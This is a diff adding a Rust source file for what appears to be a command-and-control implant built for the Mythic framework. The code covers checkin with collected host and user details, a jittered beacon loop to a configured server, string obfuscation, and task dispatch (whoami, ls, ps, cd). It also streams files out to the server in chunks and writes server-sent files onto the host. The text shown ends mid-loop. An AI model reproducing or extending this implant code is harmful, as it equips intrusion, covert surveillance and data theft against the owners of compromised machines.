@@ -1,0 +1,1752 @@
+// 负责首次握手,心跳轮询等
+
+use crate::ActiveStackWorkspace;
+use crate::commands::file::{FileDownloadSession, FileReceiveSession};
+use crate::error::{AgentError, WisconsinError, WisconsinResult};
+use crate::profiles::crypto::CryptoContext;
+use crate::profiles::http::HttpProfile;
+use crate::protocol::{
+    CheckinMessage, FileDownloadResponse, FileUploadRequest, GetTaskingMessage,
+    ServerCheckinResponse, ServerTaskPostResponseItem, ServerTaskingResponseRef,
+    TaskResponseItem,
+};
+use crate::sysinfo::SysInfoWorkspace;
+use crate::transfer::TransferSession;
+use obfstr::obfstr;
+
+/// 活动下载会话状态 (纯栈无堆分配，固定缓冲区持久化跟踪)
+#[derive(Clone, Copy)]
+#[cfg_attr(any(debug_assertions, test), derive(Debug))]
+pub struct ActiveDownload {
+    pub task_id: [u8; 36],
+    pub task_id_len: usize,
+    pub path_buf: [u8; 260],
+    pub path_len: usize,
+    pub file_id: Option<[u8; 36]>,
+    pub total_size: i64,
+    pub current_offset: u64,
+    pub is_registered: bool,
+    pub is_complete: bool,
+}
+
+impl ActiveDownload {
+    pub fn new(task_id: &str, file_path: &str, total_size: i64) -> Self {
+        let mut tid = [0u8; 36];
+        let t_len = task_id.len().min(36);
+        tid[..t_len].copy_from_slice(&task_id.as_bytes()[..t_len]);
+
+        let mut p_buf = [0u8; 260];
+        let p_len = file_path.len().min(260);
+        p_buf[..p_len].copy_from_slice(&file_path.as_bytes()[..p_len]);
+
+        Self {
+            task_id: tid,
+            task_id_len: t_len,
+            path_buf: p_buf,
+            path_len: p_len,
+            file_id: None,
+            total_size,
+            current_offset: 0,
+            is_registered: false,
+            is_complete: false,
+        }
+    }
+
+    #[inline]
+    pub fn task_id_str(&self) -> &str {
+        core::str::from_utf8(&self.task_id[..self.task_id_len]).unwrap_or("")
+    }
+
+    #[inline]
+    pub fn path_str(&self) -> &str {
+        core::str::from_utf8(&self.path_buf[..self.path_len]).unwrap_or("")
+    }
+
+    #[inline]
+    pub fn file_id_str(&self) -> Option<&str> {
+        self.file_id
+            .as_ref()
+            .and_then(|id| core::str::from_utf8(id).ok())
+    }
+}
+
+/// 活动上传会话状态 (纯栈无堆分配，固定缓冲区持久化跟踪)
+#[derive(Clone, Copy)]
+#[cfg_attr(any(debug_assertions, test), derive(Debug))]
+pub struct ActiveUpload {
+    pub task_id: [u8; 36],
+    pub task_id_len: usize,
+    pub file_id: [u8; 36],
+    pub file_id_len: usize,
+    pub path_buf: [u8; 260],
+    pub path_len: usize,
+    pub current_chunk_num: u32,
+    pub total_chunks: u32,
+    pub chunk_size: u32,
+    pub is_complete: bool,
+}
+
+impl ActiveUpload {
+    pub fn new(task_id: &str, file_id: &str, remote_path: &str, chunk_size: u32) -> Self {
+        let mut tid = [0u8; 36];
+        let t_len = task_id.len().min(36);
+        tid[..t_len].copy_from_slice(&task_id.as_bytes()[..t_len]);
+
+        let mut fid = [0u8; 36];
+        let f_len = file_id.len().min(36);
+        fid[..f_len].copy_from_slice(&file_id.as_bytes()[..f_len]);
+
+        let mut p_buf = [0u8; 260];
+        let p_len = remote_path.len().min(260);
+        p_buf[..p_len].copy_from_slice(&remote_path.as_bytes()[..p_len]);
+
+        Self {
+            task_id: tid,
+            task_id_len: t_len,
+            file_id: fid,
+            file_id_len: f_len,
+            path_buf: p_buf,
+            path_len: p_len,
+            current_chunk_num: 1,
+            total_chunks: 0,
+            chunk_size,
+            is_complete: false,
+        }
+    }
+
+    #[inline]
+    pub fn task_id_str(&self) -> &str {
+        core::str::from_utf8(&self.task_id[..self.task_id_len]).unwrap_or("")
+    }
+
+    #[inline]
+    pub fn file_id_str(&self) -> &str {
+        core::str::from_utf8(&self.file_id[..self.file_id_len]).unwrap_or("")
+    }
+
+    #[inline]
+    pub fn path_str(&self) -> &str {
+        core::str::from_utf8(&self.path_buf[..self.path_len]).unwrap_or("")
+    }
+}
+
+/// Agent 运行会话核心管理器 (Agent Session Manager)
+pub struct AgentSession {
+    /// 密码学对称上下文管理器
+    crypto: CryptoContext,
+    /// 活跃 UUID (初始为预设 Payload UUID，上线成功后置换为服务端分配的 Callback UUID)
+    active_uuid: [u8; 36],
+    /// 是否已通过上线注册 (Checkin) 握手
+    is_registered: bool,
+    /// 退出控制信号标记
+    should_exit: bool,
+    /// 当前基础休眠间隔 (秒)
+    sleep_interval: u64,
+    /// 休眠随机抖动率 (百分比: 0~100)
+    sleep_jitter: u8,
+    /// 活动文件下载会话追踪
+    pub active_download: Option<ActiveDownload>,
+    /// 活动文件上传会话追踪
+    pub active_upload: Option<ActiveUpload>,
+}
+
+impl Drop for AgentSession {
+    fn drop(&mut self) {
+        crate::buffer::zeroize_slice(&mut self.active_uuid);
+    }
+}
+
+impl AgentSession {
+    /// 初始化 Agent 会话管理器
+    ///
+    /// * `master_key`: 32 字节 AESPSK 预共享密钥
+    /// * `payload_uuid`: 初始 36 字节 Payload UUID 切片
+    pub fn new(master_key: &[u8; 32], payload_uuid: &[u8; 36]) -> WisconsinResult<Self> {
+        let crypto = CryptoContext::new(master_key)?;
+        let mut uuid_arr = [0u8; 36];
+        uuid_arr.copy_from_slice(payload_uuid);
+
+        Ok(Self {
+            crypto,
+            active_uuid: uuid_arr,
+            is_registered: false,
+            should_exit: false,
+            sleep_interval: crate::config::AgentConfig::default_sleep_interval(),
+            sleep_jitter: crate::config::AgentConfig::default_sleep_jitter(),
+            active_download: None,
+            active_upload: None,
+        })
+    }
+
+    /// 查询是否收到退出信号
+    #[inline(always)]
+    pub fn should_exit(&self) -> bool {
+        self.should_exit
+    }
+
+    /// 设置会话退出标记
+    #[inline(always)]
+    pub fn mark_exit(&mut self) {
+        self.should_exit = true;
+    }
+
+    /// 获取当前活跃 UUID 字符串切片
+    #[inline(always)]
+    pub fn active_uuid_str(&self) -> &str {
+        core::str::from_utf8(&self.active_uuid).unwrap_or("")
+    }
+
+    /// 查询当前会话是否已完成上线注册
+    #[inline(always)]
+    pub fn is_registered(&self) -> bool {
+        self.is_registered
+    }
+
+    /// 获取当前休眠周期 (秒)
+    #[inline(always)]
+    pub fn sleep_interval(&self) -> u64 {
+        self.sleep_interval
+    }
+
+    /// 获取当前休眠抖动率
+    #[inline(always)]
+    pub fn sleep_jitter(&self) -> u8 {
+        self.sleep_jitter
+    }
+
+    /// 更新休眠周期与抖动率
+    pub fn update_sleep(&mut self, interval: u64, jitter: u8) {
+        self.sleep_interval = interval;
+        self.sleep_jitter = jitter.min(100);
+    }
+
+    /// 计算本次心跳的实际动态抖动休眠时间 (秒)
+    pub fn calculate_jittered_sleep(&self) -> u64 {
+        if self.sleep_jitter == 0 || self.sleep_interval == 0 {
+            return self.sleep_interval;
+        }
+
+        let delta_max = (self.sleep_interval * self.sleep_jitter as u64) / 100;
+        if delta_max == 0 {
+            return self.sleep_interval;
+        }
+
+        // 随机在 [-delta, +delta] 范围内偏移
+        let rand_val = (rand::random::<u32>() as u64) % (delta_max * 2 + 1);
+        self.sleep_interval.saturating_sub(delta_max).saturating_add(rand_val)
+    }
+
+    /// 可中断细粒度休眠 (每 100ms 检查一次退出标记与系统关停信号，支持 DllMain 动态卸载快速唤醒)
+    pub fn interruptible_sleep(&self, seconds: u64) {
+        use core::time::Duration;
+        let total_ms = seconds.saturating_mul(1000);
+        let mut elapsed_ms = 0;
+        while elapsed_ms < total_ms && !self.should_exit && !crate::is_shutdown_requested() {
+            let step = 100.min(total_ms - elapsed_ms);
+            std::thread::sleep(Duration::from_millis(step));
+            elapsed_ms += step;
+        }
+    }
+
+    // ----------------- 核心通信握手阶段 -----------------
+
+    /// 构建上线注册请求包 Base64 (零堆分配)
+    ///
+    /// * `workspace`: 纯栈数据暂存区
+    /// * `sysinfo_ws`: 纯栈系统信息采集工作区
+    /// * 返回: 写入 `workspace.b64_buf` 的有效 Base64 字节长度
+    pub fn build_checkin_payload(
+        &self,
+        workspace: &mut ActiveStackWorkspace,
+        sysinfo_ws: &mut SysInfoWorkspace,
+    ) -> WisconsinResult<usize> {
+        let info = sysinfo_ws.collect()?;
+
+        let mut checkin_msg = CheckinMessage::new(
+            self.active_uuid_str(),
+            &info.ips,
+            info.os,
+            info.user,
+            info.host,
+            info.pid,
+            info.architecture,
+            info.domain,
+        );
+        checkin_msg = checkin_msg
+            .with_integrity_level(info.integrity_level)
+            .with_process_name(info.process_name);
+
+        let http = HttpProfile::new(
+            "",
+            "",
+            self.active_uuid_str(),
+            &self.crypto,
+        );
+
+        let len = http.pack_message(&checkin_msg, &mut workspace.raw_buf, &mut workspace.b64_buf)?;
+        Ok(len)
+    }
+
+    /// 处理服务端返回的 Checkin 响应并锁定置换正式 Callback UUID
+    pub fn handle_checkin_response<'de>(
+        &mut self,
+        payload_b64: &[u8],
+        raw_buf: &'de mut [u8],
+    ) -> WisconsinResult<ServerCheckinResponse<'de>> {
+        let http = HttpProfile::new(
+            "",
+            "",
+            self.active_uuid_str(),
+            &self.crypto,
+        );
+
+        let resp: ServerCheckinResponse<'de> = http
+            .unpack_message(payload_b64, raw_buf)?;
+
+        resp.validate()?;
+
+        // 若服务端下发了正式分配的 Callback UUID (36 字节)，就地固化至 active_uuid 并标记注册完成
+        if let Some(new_id) = resp.id
+            && new_id.len() == 36
+        {
+            self.active_uuid.copy_from_slice(new_id.as_bytes());
+            self.is_registered = true;
+        }
+
+        Ok(resp)
+    }
+
+    /// 构建任务轮询请求包 (GetTasking，支持顺风车捎带 responses)
+    ///
+    /// * `responses`: 可选的待顺风车回传的任务回执数组切片 (零堆分配)
+    /// * `workspace`: 纯栈数据暂存区
+    /// * 返回: 写入 `workspace.b64_buf` 的有效 Base64 字节长度
+    pub fn build_get_tasking_payload(
+        &self,
+        responses: Option<&[TaskResponseItem<'_>]>,
+        workspace: &mut ActiveStackWorkspace,
+    ) -> WisconsinResult<usize> {
+        if !self.is_registered {
+            return Err(WisconsinError::Agent(AgentError::NotCheckedIn));
+        }
+
+        let mut msg = GetTaskingMessage::new(1);
+        if let Some(resps) = responses {
+            msg = msg.with_responses(resps);
+        }
+
+        let http = HttpProfile::new(
+            "",
+            "",
+            self.active_uuid_str(),
+            &self.crypto,
+        );
+
+        let len = http.pack_message(&msg, &mut workspace.raw_buf, &mut workspace.b64_buf)?;
+        Ok(len)
+    }
+
+    /// 解析服务端下发的心跳响应指令报文 (零拷贝借用切片)
+    pub fn parse_tasking_response<'de>(
+        &self,
+        payload_b64: &[u8],
+        raw_buf: &'de mut [u8],
+    ) -> WisconsinResult<ServerTaskingResponseRef<'de>> {
+        let http = HttpProfile::new(
+            "",
+            "",
+            self.active_uuid_str(),
+            &self.crypto,
+        );
+
+        let resp: ServerTaskingResponseRef<'de> = http
+            .unpack_message(payload_b64, raw_buf)?;
+
+        if resp.action != obfstr!("get_tasking") {
+            return Err(WisconsinError::Agent(AgentError::TransportFailed));
+        }
+
+        Ok(resp)
+    }
+
+    /// 处理通用基础内建命令 (如 sleep)
+    pub fn handle_builtin_command(&mut self, cmd: &str, params: &str) -> bool {
+        if cmd == obfstr!("sleep") {
+            // 解析休眠参数 (支持 JSON `{"interval": 10, "jitter": 15}` 与 CLI `10 15`)
+            let interval_str = if params.trim().starts_with('{') {
+                extract_param(params, obfstr!("interval"))
+            } else {
+                params.split_whitespace().next().unwrap_or("")
+            };
+            if let Ok(sec) = interval_str.parse::<u64>() {
+                let jitter_str = if params.trim().starts_with('{') {
+                    extract_param(params, obfstr!("jitter"))
+                } else {
+                    params.split_whitespace().nth(1).unwrap_or("")
+                };
+                let jitter = jitter_str.parse::<u8>().ok().unwrap_or(self.sleep_jitter);
+                self.update_sleep(sec, jitter);
+                return true;
+            }
+        }
+        false
+    }
+
+    /// 任务分发与执行中枢 (支持 sleep, exit, pwd, cd, whoami, ls, ps, download, upload 等内建控制指令)
+    pub fn dispatch_task<'a>(
+        &mut self,
+        task: &crate::protocol::MythicTaskRef<'a>,
+        exec_ws: &mut TaskExecutionWorkspace,
+    ) {
+        let cmd = task.command.trim();
+        let params = task.parameters.trim();
+
+        obfstr! {
+            let cmd_sleep = "sleep";
+            let cmd_exit = "exit";
+            let cmd_pwd = "pwd";
+            let cmd_cd = "cd";
+            let cmd_whoami = "whoami";
+            let cmd_ls = "ls";
+            let cmd_ps = "ps";
+            let cmd_download = "download";
+            let cmd_upload = "upload";
+        }
+
+        if cmd == cmd_sleep {
+            if self.handle_builtin_command(cmd, params) {
+                exec_ws.record_response(task.id, obfstr!("sleep interval updated"), true, true);
+            } else {
+                exec_ws.record_response(task.id, obfstr!("invalid sleep parameters"), false, true);
+            }
+        } else if cmd == cmd_exit {
+            self.mark_exit();
+            exec_ws.record_response(task.id, obfstr!("agent exit signaled"), true, true);
+        } else if cmd == cmd_pwd {
+            #[cfg(windows)]
+            {
+                let mut dir_wbuf = [0u16; 260];
+                let len = unsafe {
+                    win32::GetCurrentDirectoryW(dir_wbuf.len() as u32, dir_wbuf.as_mut_ptr())
+                };
+                if len > 0 && (len as usize) < dir_wbuf.len() {
+                    let mut utf8_buf = [0u8; 520];
+                    let mut off = 0;
+                    for ch in core::char::decode_utf16(dir_wbuf[..len as usize].iter().copied()) {
+                        let c: char = ch.unwrap_or(core::char::REPLACEMENT_CHARACTER);
+                        if off + c.len_utf8() <= utf8_buf.len() {
+                            let s = c.encode_utf8(&mut utf8_buf[off..]);
+                            off += s.len();
+                        }
+                    }
+                    if let Ok(dir_str) = core::str::from_utf8(&utf8_buf[..off]) {
+                        exec_ws.record_response(task.id, dir_str, true, true);
+                    } else {
+                        exec_ws.record_response(task.id, obfstr!("failed to decode directory path"), false, true);
+                    }
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("GetCurrentDirectory failed"), false, true);
+                }
+            }
+            #[cfg(not(windows))]
+            {
+                exec_ws.record_response(task.id, obfstr!("/"), true, true);
+            }
+        } else if cmd == cmd_cd {
+            #[cfg(windows)]
+            {
+                let path_param = extract_param(params, obfstr!("path"));
+                if !path_param.is_empty() {
+                    let mut wpath = [0u16; 260];
+                    let mut wlen = 0;
+                    for c in path_param.encode_utf16() {
+                        if wlen < wpath.len() - 1 {
+                            wpath[wlen] = c;
+                            wlen += 1;
+                        }
+                    }
+                    wpath[wlen] = 0;
+                    let ok = unsafe {
+                        win32::SetCurrentDirectoryW(wpath.as_ptr())
+                    };
+                    if ok != 0 {
+                        exec_ws.record_response(task.id, obfstr!("directory changed"), true, true);
+                    } else {
+                        exec_ws.record_response(task.id, obfstr!("SetCurrentDirectory failed"), false, true);
+                    }
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("invalid path argument"), false, true);
+                }
+            }
+            #[cfg(not(windows))]
+            {
+                exec_ws.record_response(task.id, obfstr!("directory changed"), true, true);
+            }
+        } else if cmd == cmd_whoami {
+            let mut sys_ws = SysInfoWorkspace::new();
+            if let Ok(info) = sys_ws.collect() {
+                let mut out_buf = [0u8; 256];
+                let mut off = 0;
+                let dom = info.domain.as_bytes();
+                let usr = info.user.as_bytes();
+                if !dom.is_empty() {
+                    if off + dom.len() + 1 + usr.len() < out_buf.len() {
+                        out_buf[off..off + dom.len()].copy_from_slice(dom);
+                        off += dom.len();
+                        out_buf[off] = b'\\';
+                        off += 1;
+                        out_buf[off..off + usr.len()].copy_from_slice(usr);
+                        off += usr.len();
+                    }
+                } else if off + usr.len() < out_buf.len() {
+                    out_buf[off..off + usr.len()].copy_from_slice(usr);
+                    off += usr.len();
+                }
+                if let Ok(whoami_str) = core::str::from_utf8(&out_buf[..off]) {
+                    exec_ws.record_response(task.id, whoami_str, true, true);
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("failed to format whoami output"), false, true);
+                }
+            } else {
+                exec_ws.record_response(task.id, obfstr!("sysinfo collection failed"), false, true);
+            }
+        } else if cmd == cmd_ls {
+            let path_param = extract_param(params, obfstr!("path"));
+            obfstr!(let dot = ".";);
+            let target_path = if path_param.is_empty() { dot } else { path_param };
+            let mut out_buf = [0u8; 2048];
+            let mut off = 0;
+            obfstr! {
+                let p_dir = "[DIR]  ";
+                let p_file = "[FILE] ";
+                let trunc_msg = "... (truncated)\n";
+                let empty_msg = "(empty directory)\n";
+            }
+            if let Ok(entries) = std::fs::read_dir(target_path) {
+                for entry in entries.flatten() {
+                    let file_name = entry.file_name();
+                    let name_bytes = file_name.as_encoded_bytes();
+                    let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
+                    let prefix = if is_dir { p_dir } else { p_file };
+                    let p_bytes = prefix.as_bytes();
+                    if off + p_bytes.len() + name_bytes.len() + 1 >= out_buf.len() {
+                        let t_bytes = trunc_msg.as_bytes();
+                        if off + t_bytes.len() < out_buf.len() {
+                            out_buf[off..off + t_bytes.len()].copy_from_slice(t_bytes);
+                            off += t_bytes.len();
+                        }
+                        break;
+                    }
+                    out_buf[off..off + p_bytes.len()].copy_from_slice(p_bytes);
+                    off += p_bytes.len();
+                    out_buf[off..off + name_bytes.len()].copy_from_slice(name_bytes);
+                    off += name_bytes.len();
+                    out_buf[off] = b'\n';
+                    off += 1;
+                }
+                if off == 0 {
+                    let e_bytes = empty_msg.as_bytes();
+                    out_buf[..e_bytes.len()].copy_from_slice(e_bytes);
+                    off = e_bytes.len();
+                }
+                if let Ok(s) = core::str::from_utf8(&out_buf[..off]) {
+                    exec_ws.record_response(task.id, s, true, true);
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("directory listed"), true, true);
+                }
+            } else {
+                exec_ws.record_response(task.id, obfstr!("failed to read directory"), false, true);
+            }
+        } else if cmd == cmd_ps {
+            let mut sys_ws = SysInfoWorkspace::new();
+            if let Ok(info) = sys_ws.collect() {
+                let mut out_buf = [0u8; 256];
+                let mut off = 0;
+                obfstr! {
+                    let header = "PID: ";
+                    let sep = " | Image: ";
+                }
+                let h_bytes = header.as_bytes();
+                out_buf[off..off + h_bytes.len()].copy_from_slice(h_bytes);
+                off += h_bytes.len();
+                off += format_u64_local(&mut out_buf[off..], info.pid as u64);
+                let s_bytes = sep.as_bytes();
+                out_buf[off..off + s_bytes.len()].copy_from_slice(s_bytes);
+                off += s_bytes.len();
+                let p_bytes = info.process_name.as_bytes();
+                let copy_len = p_bytes.len().min(out_buf.len() - off);
+                out_buf[off..off + copy_len].copy_from_slice(&p_bytes[..copy_len]);
+                off += copy_len;
+                if let Ok(s) = core::str::from_utf8(&out_buf[..off]) {
+                    exec_ws.record_response(task.id, s, true, true);
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("process listed"), true, true);
+                }
+            } else {
+                exec_ws.record_response(task.id, obfstr!("failed to enumerate processes"), false, true);
+            }
+        } else if cmd == cmd_download {
+            let path_param = extract_param(params, obfstr!("file_path"));
+            let target_file = if path_param.is_empty() {
+                let p = extract_param(params, obfstr!("path"));
+                if p.is_empty() {
+                    extract_param(params, obfstr!("file"))
+                } else {
+                    p
+                }
+            } else {
+                path_param
+            };
+            if !target_file.is_empty() {
+                #[cfg(windows)]
+                let size_opt = crate::stream::NativeFileHandle::open_read(target_file)
+                    .ok()
+                    .and_then(|h| h.file_size().ok())
+                    .map(|s| s as i64);
+                #[cfg(not(windows))]
+                let size_opt = std::fs::metadata(target_file).ok().map(|m| m.len() as i64);
+
+                if let Some(file_size) = size_opt {
+                    let filename = extract_filename(target_file);
+                    let file_sess = FileDownloadSession::new(
+                        task.id,
+                        Some(target_file),
+                        Some(filename),
+                        file_size,
+                    );
+                    let reg_resp = file_sess.build_registration_response();
+                    let dl = ActiveDownload::new(task.id, target_file, file_size);
+                    exec_ws.record_download_response(
+                        task.id,
+                        reg_resp,
+                        obfstr!("file download registration initiated"),
+                        true,
+                        false,
+                    );
+                    self.active_download = Some(dl);
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("file not found"), false, true);
+                }
+            } else {
+                exec_ws.record_response(task.id, obfstr!("missing file path argument"), false, true);
+            }
+        } else if cmd == cmd_upload {
+            let remote_path = {
+                let p = extract_param(params, obfstr!("remote_path"));
+                if p.is_empty() {
+                    let p2 = extract_param(params, obfstr!("path"));
+                    if p2.is_empty() {
+                        extract_param(params, obfstr!("destination"))
+                    } else {
+                        p2
+                    }
+                } else {
+                    p
+                }
+            };
+            let file_id = {
+                let fid = extract_param(params, obfstr!("file"));
+                if fid.is_empty() {
+                    extract_param(params, obfstr!("file_id"))
+                } else {
+                    fid
+                }
+            };
+            if !remote_path.is_empty() && !file_id.is_empty() {
+                let chunk_size = 512 * 1024;
+                if let Ok(recv_sess) = FileReceiveSession::new(task.id, file_id, chunk_size, Some(remote_path)) {
+                    let req = recv_sess.session.build_chunk_request();
+                    let ul = ActiveUpload::new(task.id, file_id, remote_path, chunk_size);
+                    exec_ws.record_upload_response(
+                        task.id,
+                        req,
+                        obfstr!("file upload initiated"),
+                        true,
+                        false,
+                    );
+                    self.active_upload = Some(ul);
+                } else {
+                    exec_ws.record_response(task.id, obfstr!("failed to initialize upload session (invalid UUID)"), false, true);
+                }
+            } else {
+                exec_ws.record_response(task.id, obfstr!("missing remote_path or file argument"), false, true);
+            }
+        } else {
+            exec_ws.record_response(task.id, obfstr!("command not implemented"), false, true);
+        }
+    }
+
+    /// 处理服务端针对客户端历史 responses 的确认回执 (如返回 file_id 等)
+    pub fn handle_server_post_responses(
+        &mut self,
+        responses: &[ServerTaskPostResponseItem<'_>],
+    ) {
+        for resp in responses {
+            // 匹配活跃下载任务的注册回执与分片确认
+            if let Some(ref mut dl) = self.active_download
+                && resp.task_id == dl.task_id_str()
+            {
+                if !dl.is_registered {
+                    let mut sess = TransferSession::new(dl.task_id_str(), dl.total_size);
+                    if let Ok(id_str) = sess.handle_register_ack(resp) {
+                        let mut arr = [0u8; 36];
+                        arr.copy_from_slice(id_str.as_bytes());
+                        dl.file_id = Some(arr);
+                        dl.is_registered = true;
+                    }
+                } else if resp.chunk_offset.is_some() {
+                    let mut sess = TransferSession::new_with_transfer_id(
+                        dl.task_id_str(),
+                        dl.total_size,
+                        dl.file_id.unwrap_or([0u8; 36]),
+                        dl.current_offset,
+                    );
+                    if let Ok(new_offset) = sess.handle_chunk_ack(resp) {
+                        dl.current_offset = new_offset;
+                        dl.is_complete = dl.total_size >= 0 && dl.current_offset >= dl.total_size as u64;
+                    }
+                }
+            }
+
+            // 匹配活跃上传任务的回执并落盘写入分片
+            if let Some(ref mut ul) = self.active_upload {
+                let task_id_arr = ul.task_id;
+                let task_id_len = ul.task_id_len;
+                let task_id_str = core::str::from_utf8(&task_id_arr[..task_id_len]).unwrap_or("");
+                if resp.task_id == task_id_str && let Some(chunk_data_b64) = resp.chunk_data {
+                    let file_id_arr = ul.file_id;
+                    let file_id_len = ul.file_id_len;
+                    let file_id_str = core::str::from_utf8(&file_id_arr[..file_id_len]).unwrap_or("");
+                    let path_arr = ul.path_buf;
+                    let path_len = ul.path_len;
+                    let path_str = core::str::from_utf8(&path_arr[..path_len]).unwrap_or("");
+
+                    if let Ok(mut recv_sess) = FileReceiveSession::new(
+                        task_id_str,
+                        file_id_str,
+                        ul.chunk_size,
+                        Some(path_str),
+                    ) {
+                        recv_sess.session.current_chunk_num = ul.current_chunk_num;
+                        recv_sess.session.total_chunks = ul.total_chunks;
+
+                        let chunk_n = resp.chunk_num.unwrap_or(ul.current_chunk_num);
+                        let mut decode_buf = [0u8; crate::BUFFER_SIZE];
+                        let total_c = resp.total_chunks.unwrap_or(ul.total_chunks);
+
+                        #[cfg(windows)]
+                        {
+                            let file_res = if chunk_n <= 1 {
+                                crate::stream::NativeFileHandle::open_write_truncate(path_str)
+                            } else {
+                                crate::stream::NativeFileHandle::open_write_append(path_str)
+                            };
+
+                            if let Ok(mut file) = file_res {
+                                if let Ok(_written) = recv_sess.session.write_incoming_chunk(
+                                    chunk_data_b64,
+                                    total_c,
+                                    chunk_n,
+                                    &mut decode_buf,
+                                    &mut file,
+                                ) {
+                                    ul.current_chunk_num = recv_sess.session.current_chunk_num;
+                                    ul.total_chunks = recv_sess.session.total_chunks;
+                                    ul.is_complete = recv_sess.session.is_complete;
+                                }
+                            }
+                        }
+
+                        #[cfg(not(windows))]
+                        {
+                            let mut open_opts = std::fs::OpenOptions::new();
+                            open_opts.create(true).write(true);
+                            if chunk_n <= 1 {
+                                open_opts.truncate(true);
+                            } else {
+                                open_opts.append(true);
+                            }
+
+                            if let Ok(mut file) = open_opts.open(path_str) {
+                                if let Ok(_written) = recv_sess.session.write_incoming_chunk(
+                                    chunk_data_b64,
+                                    total_c,
+                                    chunk_n,
+                                    &mut decode_buf,
+                                    &mut file,
+                                ) {
+                                    ul.current_chunk_num = recv_sess.session.current_chunk_num;
+                                    ul.total_chunks = recv_sess.session.total_chunks;
+                                    ul.is_complete = recv_sess.session.is_complete;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    /// 推进活动文件传输会话 (分片读取泵送 / 分片拉取挂载)
+    pub fn step_file_transfers(
+        &mut self,
+        exec_ws: &mut TaskExecutionWorkspace,
+        workspace: &mut ActiveStackWorkspace,
+    ) {
+        // 1. 推进下载会话 (读取下一分片并挂载回执)
+        if let Some(mut dl) = self.active_download
+            && dl.is_registered
+            && !dl.is_complete
+            && let Some(file_id) = dl.file_id
+        {
+            let task_id_arr = dl.task_id;
+            let task_id_len = dl.task_id_len;
+            let task_id = core::str::from_utf8(&task_id_arr[..task_id_len]).unwrap_or("");
+            let path_arr = dl.path_buf;
+            let path_len = dl.path_len;
+            let path = core::str::from_utf8(&path_arr[..path_len]).unwrap_or("");
+            let filename = extract_filename(path);
+            let mut sess = FileDownloadSession::new_with_file_id(
+                task_id,
+                Some(path),
+                Some(filename),
+                dl.total_size,
+                file_id,
+                dl.current_offset,
+            );
+
+            #[cfg(windows)]
+            let file_source = crate::stream::NativeFileHandle::open_read(path);
+            #[cfg(not(windows))]
+            let file_source = std::fs::File::open(path);
+
+            if let Ok(mut file) = file_source {
+                match sess.read_next_chunk_file(&mut file, workspace, true) {
+                    Ok((chunk_resp, read_bytes)) => {
+                        dl.current_offset = dl.current_offset.saturating_add(read_bytes as u64);
+                        dl.is_complete = dl.total_size >= 0 && dl.current_offset >= dl.total_size as u64;
+
+                        let completed = dl.is_complete;
+                        obfstr! {
+                            let msg_completed = "file download completed";
+                            let msg_streaming = "streaming chunk";
+                        }
+                        let user_msg = if completed {
+                            msg_completed
+                        } else {
+                            msg_streaming
+                        };
+
+                        exec_ws.record_download_response(
+                            task_id,
+                            chunk_resp,
+                            user_msg,
+                            true,
+                            completed,
+                        );
+
+                        if completed {
+                            self.active_download = None;
+                        } else {
+                            self.active_download = Some(dl);
+                        }
+                    }
+                    Err(_) => {
+                        exec_ws.record_response(task_id, obfstr!("failed to pump file chunk"), false, true);
+                        self.active_download = None;
+                    }
+                }
+            } else {
+                exec_ws.record_response(task_id, obfstr!("failed to open file for streaming"), false, true);
+                self.active_download = None;
+            }
+        }
+
+        // 2. 推进上传会话 (请求下一个分片)
+        if let Some(ul) = self.active_upload {
+            if !ul.is_complete {
+                let task_id = ul.task_id_str();
+                let file_id = ul.file_id_str();
+                let path = ul.path_str();
+
+                if let Ok(recv_sess) = FileReceiveSession::new(
+                    task_id,
+                    file_id,
+                    ul.chunk_size,
+                    Some(path),
+                ) {
+                    let mut sess = recv_sess.session;
+                    sess.current_chunk_num = ul.current_chunk_num;
+                    sess.total_chunks = ul.total_chunks;
+                    let req = sess.build_chunk_request();
+                    exec_ws.record_upload_response(task_id, req, obfstr!("requesting next chunk"), true, false);
+                }
+            } else {
+                exec_ws.record_response(ul.task_id_str(), obfstr!("file upload completed"), true, true);
+                self.active_upload = None;
+            }
+        }
+    }
+
+    /// 运行 Agent 主心跳事件循环 (Checkin -> GetTasking -> Dispatch -> Piggybacking -> Sleep)
+    #[cfg(windows)]
+    pub fn run(&mut self) {
+        use crate::profiles::http::winhttp::WinHttpTransport;
+        use crate::protocol::StackVec;
+
+        crate::config_server_host!(server_host);
+        crate::config_post_uri!(post_uri);
+        crate::config_user_agent!(user_agent);
+        let server_port = crate::config::AgentConfig::server_port();
+        let is_https = crate::config::AgentConfig::is_https();
+
+        let transport = match WinHttpTransport::new(server_host, server_port, is_https, user_agent) {
+            Ok(t) => t,
+            Err(_) => return,
+        };
+
+        let mut workspace = ActiveStackWorkspace::new();
+        let mut sysinfo_ws = SysInfoWorkspace::new();
+        let mut exec_ws = TaskExecutionWorkspace::new();
+        let mut server_resp_buf = [0u8; crate::MAX_B64_LEN];
+
+        // 1. 上线注册循环 (Checkin Phase)
+        while !self.is_registered && !self.should_exit && !crate::is_shutdown_requested() {
+            if let Ok(b64_len) = self.build_checkin_payload(&mut workspace, &mut sysinfo_ws)
+                && let Ok(recv_len) = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf)
+            {
+                let _ = self.handle_checkin_response(&server_resp_buf[..recv_len], &mut workspace.raw_buf);
+            }
+
+            if !self.is_registered {
+                let sleep_secs = self.calculate_jittered_sleep();
+                self.interruptible_sleep(sleep_secs);
+            }
+        }
+
+        // 2. 常态心跳与任务调度循环 (GetTasking & Piggybacking Loop)
+        while !self.should_exit && !crate::is_shutdown_requested() {
+            // 推进活动流式传输（文件下载分片泵送 / 上传分片请求）
+            self.step_file_transfers(&mut exec_ws, &mut workspace);
+
+            let b64_len_res = {
+                let mut resp_items = StackVec::<TaskResponseItem<'_>, 16>::new();
+                exec_ws.build_items(&mut resp_items);
+
+                let piggybacked = if resp_items.is_empty() {
+                    None
+                } else {
+                    Some(resp_items.as_slice())
+                };
+
+                self.build_get_tasking_payload(piggybacked, &mut workspace)
+            };
+
+            if let Ok(b64_len) = b64_len_res
+                && let Ok(recv_len) = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf)
+            {
